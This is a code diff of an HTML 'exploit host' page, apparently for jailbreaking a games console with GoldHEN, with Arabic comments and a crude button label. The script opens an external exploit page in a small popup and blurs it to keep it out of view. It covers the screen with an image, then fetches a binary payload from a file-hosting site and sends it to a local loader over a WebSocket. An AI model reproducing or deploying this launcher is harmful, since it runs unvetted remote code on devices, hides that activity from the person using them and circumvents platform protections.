@@ -4,21 +4,17 @@
 <title>💀 RIDERMAX HOST</title><style>
 body{
  margin:0;
- background:black;
+ background:#0b0f1a;
+ color:#00ffaa;
  text-align:center;
+ font-family:monospace;
 }
 
-/* الصورة */
-#screen{
- width:100%;
- height:100vh;
- object-fit:cover;
- display:none;
+#main{
+ padding-top:120px;
 }
 
-/* زر */
 button{
- margin-top:150px;
  padding:20px 50px;
  font-size:22px;
  border:none;
@@ -26,28 +22,73 @@ button{
  background:#00ffaa;
  cursor:pointer;
 }
-</style></head><body><button onclick="start()">💀 هكرني ابن بنية</button>
 
-<img id="screen" src="https://i.postimg.cc/h4zBMzKT/Screenshot-20260315-194622.jpg"><script>
+/* شاشة الصورة */
+#overlay{
+ display:none;
+ position:fixed;
+ top:0;
+ left:0;
+ width:100%;
+ height:100%;
+ background:black;
+ z-index:9999;
+}
+
+#overlay img{
+ width:100%;
+ height:100%;
+ object-fit:cover;
+}
+</style></head><body><div id="main">
+<h1>@ridermax707</h1>
+<h2>🔥 AUTO EXPLOIT + GOLDHEN</h2>
+<button onclick="start()">💀 هكرني ابن بنية</button>
+</div><div id="overlay">
+<img src="https://i.postimg.cc/h4zBMzKT/Screenshot-20260315-194622.jpg">
+</div><script>
 function start(){
 
  // إظهار الصورة
- document.querySelector("button").style.display="none";
- document.getElementById("screen").style.display="block";
+ document.getElementById("overlay").style.display="block";
 
- // فتح exploit بمربع صغير مخفي
+ // فتح exploit بمربع مخفي
  let win = window.open(
   "https://4psf.gt.tc/version-selector.html?i=1",
   "_blank",
   "width=300,height=300"
  );
 
- // محاولة تصغيره
  if(win){
   win.blur();
   window.focus();
  }
 
+ // بعد 6 ثواني نحاول تشغيل GoldHEN
+ setTimeout(runHen,6000);
+}
+
+function runHen(){
+
+ let ws=new WebSocket("ws://127.0.0.1:9020");
+ ws.binaryType="arraybuffer";
+
+ ws.onopen=()=>{
+  fetch("https://files.catbox.moe/6e7po9.bin")
+  .then(r=>r.arrayBuffer())
+  .then(buf=>{
+    ws.send(buf);
+
+    // إخفاء الصورة بعد النجاح
+    setTimeout(()=>{
+      document.getElementById("overlay").style.display="none";
+    },2000);
+  });
+ };
+
+ ws.onerror=()=>{
+  alert("❌ تأكد إن exploit اشتغل");
+ };
 }
 </script></body>
 </html>
